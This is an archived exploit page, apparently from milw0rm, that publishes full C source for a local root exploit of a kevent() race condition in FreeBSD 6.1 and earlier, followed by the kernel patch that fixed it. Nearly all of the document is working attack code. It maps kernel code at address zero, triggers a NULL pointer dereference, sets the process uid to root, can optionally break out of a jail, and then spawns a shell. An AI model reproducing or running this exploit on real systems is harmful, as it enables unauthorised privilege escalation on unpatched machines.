<html><head><title>FreeBSD <= 6.1 kqueue() NULL pointer Dereference Local Root Exploit </title></head><pre>FreeBSD &lt;= 6.1 suffers from classical check/use race condition on SMP
systems in kevent() syscall, leading to kernel mode NULL pointer
dereference. It can be triggered by spawning two threads:
1st thread looping on open() and close() syscalls, and the 2nd thread
looping on kevent(), trying to add possibly invalid filedescriptor. 

The bug was fixed in 6.1-STABLE, just before release of 6.2-RELEASE, but
was not recognized as security vulnerability.

The following code exploits this vulnerability to run root shell.

/* 22.08.2009, babcia padlina 
 * FreeBSD kevent() race condition exploit
 * 
 * works only on multiprocessor systems
 * gcc -o padlina padlina.c -lpthread
 * -DPRISON_BREAK if you want to exit from jail
 *
 * with thanks to Pawel Pisarczyk for in-depth ia-32 architecture discussion 
 */

#define _KERNEL

#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/event.h&gt;
#include &lt;sys/timespec.h&gt;
#include &lt;pthread.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/linker.h&gt;
#include &lt;sys/proc.h&gt;

int fd, kq;
struct kevent kev, ke;
struct timespec timeout;
volatile int gotroot = 0;

static void kernel_code(void) {
	struct thread *thread;
	gotroot = 1;
	asm(
		&quot;movl %%fs:0, %0&quot;
		: &quot;=r&quot;(thread)
	);
	thread-&gt;td_proc-&gt;p_ucred-&gt;cr_uid = 0;
#ifdef PRISON_BREAK
	thread-&gt;td_proc-&gt;p_ucred-&gt;cr_prison = NULL;
#endif
	return;
}

static void code_end(void) {
	return;
}

void do_thread(void) {
	usleep(100);

	while (!gotroot) {
		memset(&amp;kev, 0, sizeof(kev));
		EV_SET(&amp;kev, fd, EVFILT_VNODE, EV_ADD, 0, 0, NULL);

		if (kevent(kq, &amp;kev, 1, &amp;ke, 1, &amp;timeout) &lt; 0)
			perror(&quot;kevent&quot;);
	}

	return;
}

void do_thread2(void) {
	while(!gotroot) {
		if ((fd = open(&quot;/tmp/.padlina&quot;, O_RDWR | O_CREAT, 0600)) &lt; 0)
			perror(&quot;open&quot;);

		close(fd);
	}

	return;
}

int main(void) {
	int i;
	pthread_t pth, pth2;

	if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) &lt; 0) {
		perror(&quot;mmap&quot;);
		return -1;
	}

	memcpy(0, &amp;kernel_code, &amp;code_end - &amp;kernel_code);

	if ((kq = kqueue()) &lt; 0) {
		perror(&quot;kqueue&quot;);
		return -1;
	}

	pthread_create(&amp;pth, NULL, (void *)do_thread, NULL);
	pthread_create(&amp;pth2, NULL, (void *)do_thread2, NULL);

	timeout.tv_sec = 0;
	timeout.tv_nsec = 1;

	printf(&quot;waiting for root...\n&quot;);
	i = 0;

	while (!gotroot &amp;&amp; i++ &lt; 10000)
		usleep(100);

	setuid(0);

	if (getuid()) {
		printf(&quot;failed - system patched or not MP\n&quot;);
		return -1;
	}

	printf(&quot;hwdp!\n&quot;);

	execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);

	return 0;
}


/*
Patch for this vulnerability, as in CVS:

--- src/sys/kern/kern_descrip.c	2006/09/04 10:30:09	1.279.2.8
+++ src/sys/kern/kern_descrip.c	2006/09/29 18:30:48	1.279.2.9
@@ -35,7 +35,7 @@
  */
 
 #include &lt;sys/cdefs.h&gt;
-__FBSDID(&quot;$FreeBSD: /usr/local/www/cvsroot/FreeBSD/src/sys/kern/kern_descrip.c,v 1.279.2.8 2006/09/04 10:30:09 pjd Exp $&quot;);
+__FBSDID(&quot;$FreeBSD: /usr/local/www/cvsroot/FreeBSD/src/sys/kern/kern_descrip.c,v 1.279.2.9 2006/09/29 18:30:48 jmg Exp $&quot;);
 
 #include &quot;opt_compat.h&quot;
 #include &quot;opt_ddb.h&quot;
@@ -2602,7 +2602,7 @@ static int
 badfo_kqfilter(struct file *fp, struct knote *kn)
 {
 
-	return (0);
+	return (EBADF);
 }
 
 static int
*/

// milw0rm.com [2009-08-24]</pre></html>